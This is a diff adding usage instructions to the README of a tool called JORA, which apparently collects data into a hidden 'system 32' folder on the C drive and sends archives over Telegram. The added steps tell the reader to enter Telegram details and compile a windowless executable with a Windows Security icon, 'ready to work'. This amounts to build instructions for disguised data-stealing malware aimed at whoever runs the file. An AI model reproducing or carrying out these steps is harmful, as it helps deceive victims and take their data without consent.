@@ -20,6 +20,21 @@ JORA functionality:
 
 * Sending data archives via telegram
 ---
+## USE
+
+You need to pull the project fromthe repository. 
+
+Fill in the details of your telegram. 
+
+Install all libraries from requirements.txt , start the virtual environment and run the command
+
+pyinstaller --onefile -w --icon=img\windows-security-new.png main.py
+
+which is located in the command to create file exe.txt.
+
+The result is an exe file ready to work.
+
+---
 ### The work process is the following.
 
 The directory "system 32" is created on the C drive, three new folders are already created inside it for storing data.
